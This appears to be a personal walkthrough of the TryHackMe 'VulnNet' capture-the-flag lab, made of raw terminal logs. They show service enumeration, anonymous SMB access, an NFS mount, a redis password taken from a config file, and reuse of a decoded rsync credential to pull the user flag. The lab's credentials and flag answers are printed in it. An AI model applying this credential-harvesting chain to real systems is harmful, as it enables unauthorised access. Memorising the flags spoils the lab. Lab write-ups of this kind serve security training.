thm - 2021_05_25 VulnNet

──(kali㉿kali)-[~/tryhackme/vulnet]
└─$ nmap -sV -sC -o nmap 10.10.178.186                              4 ⚙

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 11:00 EDT
Nmap scan report for 10.10.178.186
Host is up (0.27s latency).
Not shown: 993 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36067/tcp   mountd
|   100005  1,2,3      40092/udp   mountd
|   100005  1,2,3      41676/udp6  mountd
|   100005  1,2,3      48177/tcp6  mountd
|   100021  1,3,4      33235/tcp6  nlockmgr
|   100021  1,3,4      33435/tcp   nlockmgr
|   100021  1,3,4      40555/udp   nlockmgr
|   100021  1,3,4      45252/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-05-25T17:01:32+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-25T15:01:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.49 seconds

139 and 445 seems to be the target given that there's no http port


└─$ smbclient -L \\\\10.10.178.186\\ -N                         1 ⨯ 4 ⚙

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
                                                                        
┌──(kali㉿kali)-[~/tryhackme/vulnet]
└─$ smbclient -L \\\\10.10.178.186\\shares\\ -N                     4 ⚙

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
                                                                        
┌──(kali㉿kali)-[~/tryhackme/vulnet]
└─$ smbclient \\\\10.10.178.186\\shares\\ -N                        4 ⚙
Try "help" to get a list of possible commands.
smb: \> 


smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021
pu
                11309648 blocks of size 1024. 3276884 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \temp\> 


┌──(kali㉿kali)-[/tmp]
└─$ ls                                                                                                                     3 ⚙
burp18175702294850329231.tmp
burp7295545103297033735.tmp
hsperfdata_kali
NNFS
ssh-IL4vLu5mm19n
systemd-private-404335ddf97b464da3ada14d9dc16ebf-colord.service-TP2P2f
systemd-private-404335ddf97b464da3ada14d9dc16ebf-haveged.service-LqE7vj
systemd-private-404335ddf97b464da3ada14d9dc16ebf-ModemManager.service-ZfrJRg
systemd-private-404335ddf97b464da3ada14d9dc16ebf-systemd-logind.service-1BCDdi
systemd-private-404335ddf97b464da3ada14d9dc16ebf-upower.service-aW4spi
Temp-9ca31cd1-96f4-410b-9bd3-37b0d4d03fed
Temp-de34e354-f03b-42aa-b99f-5fc6572c2941
VMwareDnD
vmware-root_522-2965382515
                                                                                                                               
┌──(kali㉿kali)-[/tmp]
└─$ cd NNFS                                                                                                                3 ⚙
                                                                                                                               
┌──(kali㉿kali)-[/tmp/NNFS]
└─$ ls                                                                                                                     3 ⚙
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                                                               
┌──(kali㉿kali)-[/tmp/NNFS]
└─$  NNFS       


┌──(kali㉿kali)-[/tmp/NNFS]
└─$ ls                                                                                                                 1 ⨯ 3 ⚙
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                                                               
┌──(kali㉿kali)-[/tmp/NNFS]
└─$ cd redis                                                                                                               3 ⚙
                                                                                                                               
┌──(kali㉿kali)-[/tmp/NNFS/redis]
└─$ cat redis.conf | grep "pass"                                                                                           3 ⚙
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B65Hx562F@ggAZ@F"
# resync is enough, just passing the portion of data the slave missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared


                                                                                                      
┌──(kali㉿kali)-[~/tryhackme/vulnet]
└─$ redis-cli -h 10.10.178.186 -p 6379 -a "B65Hx562F@ggAZ@F"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.178.186:6379> ls
(error) ERR unknown command 'ls'
10.10.178.186:6379> KEYS *
1) "internal flag"
2) "int"
3) "authlist"
4) "marketlist"
5) "tmp"
10.10.178.186:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.178.186:6379> 


10.10.178.186:6379> type authlist
list
10.10.178.186:6379> lrange authlist 1 100
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v


┌──(kali㉿kali)-[~/tryhackme/vulnet]
└─$ rsync -v rsync://rsync-connect@'10.10.178.186'/files/sys-internal/user.txt 
Password: 
user.txt
sent 43 bytes  received 128 bytes  31.09 bytes/sec
total size is 38  speedup is 0.22
                                                                                                   
business-req.txt  data.txt  dog  mnt  mount0  nmap  services.txt  user.txt
                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/tryhackme/vulnet]
└─$ cat user.txt                                                                                                                                                                                            2 ⚙
THM{da7c20696831f253e0afaca8b83c07ab}

to come back for root flag
